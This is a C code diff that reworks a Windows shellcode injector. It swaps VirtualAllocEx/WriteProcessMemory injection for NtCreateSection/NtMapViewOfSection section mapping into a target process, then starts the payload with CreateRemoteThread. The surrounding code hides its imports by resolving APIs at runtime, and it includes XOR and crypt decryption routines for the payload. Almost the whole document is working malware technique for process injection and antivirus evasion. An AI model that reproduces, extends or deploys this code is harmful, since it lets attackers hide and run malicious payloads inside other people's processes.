@@ -1,3 +1,4 @@
+#include <winternl.h>
 #include <windows.h>
 #include <tlhelp32.h>
 #include <wincrypt.h>
@@ -7,7 +8,7 @@
 #include "helpers.h"
 
 // LNK4210: Cannot have global variables using this, 'global' variables declared in each func
-#pragma comment(linker, "/entry:WinMain")
+// #pragma comment(linker, "/entry:WinMain")
 
 // Resolved function types
 typedef HMODULE (WINAPI * GetModuleHandle_t)(LPCWSTR lpModuleName);
@@ -38,6 +39,59 @@ typedef BOOL (WINAPI * CryptDecrypt_t)(HCRYPTKEY hKey, HCRYPTHASH hHash, BOOL Fi
 typedef BOOL (WINAPI * CryptReleaseContext_t)(HCRYPTPROV hProv, DWORD dwFlags);
 typedef BOOL (WINAPI * CryptDestroyHash_t)(HCRYPTHASH hHash);
 typedef BOOL (WINAPI * CryptDestroyKey_t)(HCRYPTKEY hKey);
+
+// --------------------- MapView Delivery ---------------------
+typedef struct _CLIENT_ID {
+    HANDLE UniqueProcess;
+    HANDLE UniqueThread;
+} CLIENT_ID, *PCLIENT_ID;
+
+typedef struct _UNICODE_STRING {
+    USHORT Length;
+    USHORT MaximumLength;
+    _Field_size_bytes_part_(MaximumLength, Length) PWCH Buffer;
+} UNICODE_STRING, *PUNICODE_STRING;
+
+typedef struct _OBJECT_ATTRIBUTES {
+    ULONG Length;
+    HANDLE RootDirectory;
+    PUNICODE_STRING ObjectName;
+    ULONG Attributes;
+    PVOID SecurityDescriptor; // PSECURITY_DESCRIPTOR;
+    PVOID SecurityQualityOfService; // PSECURITY_QUALITY_OF_SERVICE
+} OBJECT_ATTRIBUTES, *POBJECT_ATTRIBUTES;
+
+typedef NTSTATUS (NTAPI * NtCreateSection_t)(
+    PHANDLE SectionHandle,
+    ULONG DesiredAccess,
+    POBJECT_ATTRIBUTES ObjectAttributes,
+    PLARGE_INTEGER MaximumSize,
+    ULONG PageAttributess,
+    ULONG SectionAttributes,
+    HANDLE FileHandle); 
+
+typedef NTSTATUS (NTAPI * NtMapViewOfSection_t)(
+    HANDLE SectionHandle,
+    HANDLE ProcessHandle,
+    PVOID * BaseAddress,
+    ULONG_PTR ZeroBits,
+    SIZE_T CommitSize,
+    PLARGE_INTEGER SectionOffset,
+    PSIZE_T ViewSize,
+    DWORD InheritDisposition,
+    ULONG AllocationType,
+    ULONG Win32Protect);
+
+typedef enum _SECTION_INHERIT {
+    ViewShare = 1,
+    ViewUnmap = 2
+} SECTION_INHERIT, *PSECTION_INHERIT;
+
+
+typedef HANDLE (WINAPI * GetCurrentProcess_t)();
+
+// ------------------ End of MapView Delivery ------------------
+
 
 
 void XOR(char *data, size_t data_len, char *key, size_t key_len) {
@@ -140,10 +194,11 @@ int FindTarget(const char *procname) {
 }
 
 int Inject(HANDLE hProc, unsigned char *payload, unsigned int payload_len) {
-
-    LPVOID pRemoteCode = NULL;
+    
     HANDLE hThread = NULL;
-    DWORD oldProtect = 0;
+    HANDLE hSection = NULL;
+    PVOID pLocalView = NULL, pRemoteView = NULL;
+    CLIENT_ID cid;
 
     // 'Global' variables
     GetModuleHandle_t pGetModuleHandle = (GetModuleHandle_t) hlpGetProcAddress(hlpGetModuleHandle(L"KERNEL32.DLL"), "GetModuleHandleW");
@@ -151,17 +206,26 @@ int Inject(HANDLE hProc, unsigned char *payload, unsigned int payload_len) {
     CloseHandle_t pCloseHandle = (CloseHandle_t) pGetProcAddress(pGetModuleHandle(L"KERNEL32.DLL"), "CloseHandle");
 
     // Resolved functions
-    VirtualAllocEx_t pVirtualAllocEx = (VirtualAllocEx_t) pGetProcAddress(pGetModuleHandle(L"KERNEL32.DLL"), "VirtualAllocEx");
-    WriteProcessMemory_t pWriteProcessMemory = (WriteProcessMemory_t) pGetProcAddress(pGetModuleHandle(L"KERNEL32.DLL"), "WriteProcessMemory");
-    VirtualProtectEx_t pVirtualProtectEx = (VirtualProtectEx_t) pGetProcAddress(pGetModuleHandle(L"KERNEL32.DLL"), "VirtualProtectEx");
     CreateRemoteThread_t pCreateRemoteThread = (CreateRemoteThread_t) pGetProcAddress(pGetModuleHandle(L"KERNEL32.DLL"), "CreateRemoteThread");
     WaitForSingleObject_t pWaitForSingleObject = (WaitForSingleObject_t) pGetProcAddress(pGetModuleHandle(L"KERNEL32.DLL"), "WaitForSingleObject");
+    NtCreateSection_t pNtCreateSection = (NtCreateSection_t) pGetProcAddress(pGetModuleHandle(L"NTDLL.DLL"), "NtCreateSection");
+    NtMapViewOfSection_t pNtMapViewOfSection = (NtMapViewOfSection_t) pGetProcAddress(pGetModuleHandle(L"NTDLL.DLL"), "NtMapViewOfSection");
+    RtlMoveMemory_t pRtlMoveMemory = (RtlMoveMemory_t) pGetProcAddress(pGetModuleHandle(L"KERNEL32.DLL"), "RtlMoveMemory");
+    GetCurrentProcess_t pGetCurrentProcess = (GetCurrentProcess_t) pGetProcAddress(pGetModuleHandle(L"KERNEL32.DLL"), "GetCurrentProcess");
 
-    pRemoteCode = pVirtualAllocEx(hProc, NULL, payload_len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
-    pWriteProcessMemory(hProc, pRemoteCode, payload, payload_len, NULL);
-    pVirtualProtectEx(hProc, pRemoteCode, payload_len, PAGE_EXECUTE_READWRITE, &oldProtect);
+    // Create memory section NtCreateSection
+    pNtCreateSection(&hSection, SECTION_ALL_ACCESS, NULL, (PLARGE_INTEGER) &payload_len, PAGE_EXECUTE_READWRITE, SEC_COMMIT, NULL);
+
+    // Create local view, NtMapViewOfSection rw
+    pNtMapViewOfSection(hSection, pGetCurrentProcess(), &pLocalView, NULL, NULL, NULL, (SIZE_T *) &payload_len, ViewUnmap, NULL, PAGE_READWRITE);
+
+    // Move payload to view
+    pRtlMoveMemory(pLocalView, payload, payload_len);
     
-    hThread = pCreateRemoteThread(hProc, NULL, 0, (LPTHREAD_START_ROUTINE) pRemoteCode, NULL, 0, NULL);
+    // Create remote view: NEEDS TO BE XRW TO DECODE PAYLOAD (CHANGE THIS)
+    pNtMapViewOfSection(hSection, hProc, &pRemoteView, NULL, NULL, NULL, (SIZE_T *) &payload_len, ViewUnmap, NULL, PAGE_EXECUTE_READWRITE);
+    
+    hThread = pCreateRemoteThread(hProc, NULL, 0, (LPTHREAD_START_ROUTINE) pRemoteView, NULL, 0, NULL);
 
     if (hThread != NULL) {
             pWaitForSingleObject(hThread, -1);
